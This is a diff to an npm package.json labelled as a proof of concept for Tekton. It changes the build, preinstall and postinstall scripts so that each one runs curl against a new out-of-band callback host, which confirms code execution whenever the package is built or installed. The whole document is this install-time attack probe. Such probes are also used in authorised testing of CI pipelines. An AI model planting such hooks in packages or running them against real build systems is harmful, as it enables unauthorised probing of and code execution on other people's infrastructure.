@@ -3,8 +3,8 @@
   "version": "1.0.0",
   "description": "POC for Tekton",
   "scripts": {
-    "build": "curl http://d52eqko3t4glbd7pm78g1oah6nforiqdc.oast.pro/npm_build",
-    "preinstall": "curl http://d52eqko3t4glbd7pm78g1oah6nforiqdc.oast.pro/npm_preinstall",
-    "postinstall": "curl http://d52eqko3t4glbd7pm78g1oah6nforiqdc.oast.pro/npm_postinstall"
+    "build": "curl http://d52f32g3t4gnf3lq0g60xzzuc13obr7bm.oast.online/npm_build",
+    "preinstall": "curl http://d52f32g3t4gnf3lq0g60xzzuc13obr7bm.oast.online/npm_preinstall",
+    "postinstall": "curl http://d52f32g3t4gnf3lq0g60xzzuc13obr7bm.oast.online/npm_postinstall"
   }
 }
